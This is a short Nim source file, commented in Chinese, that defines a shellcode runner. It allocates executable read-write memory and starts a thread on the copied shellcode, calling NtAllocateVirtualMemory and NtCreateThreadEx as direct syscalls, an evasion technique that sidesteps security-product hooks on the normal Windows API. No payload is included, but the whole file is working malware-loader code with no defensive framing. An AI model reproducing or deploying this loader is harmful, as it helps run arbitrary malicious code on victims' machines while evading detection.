import winim/lean
import syscalls

proc execute_shellcode*(shellcode: openArray[byte]) =
  var baseAddr: PVOID
  var regionSize: SIZE_T = cast[SIZE_T](len(shellcode))
  
  # 使用Syscall分配内存
  discard syscallNtAllocateVirtualMemory(
    cast[HANDLE](-1),
    addr baseAddr,
    0,
    addr regionSize,
    MEM_COMMIT or MEM_RESERVE,
    PAGE_EXECUTE_READWRITE
  )
  
  # 写入Shellcode
  copyMem(baseAddr, unsafeAddr shellcode[0], len(shellcode))
  
  # 创建线程执行
  var hThread: HANDLE
  discard syscallNtCreateThreadEx(
    addr hThread,
    THREAD_ALL_ACCESS,
    NULL,
    cast[HANDLE](-1),
    baseAddr,
    NULL,
    FALSE,
    0, 0, 0, NULL
  )
  
  # 等待执行完成
  WaitForSingleObject(hThread, INFINITE)
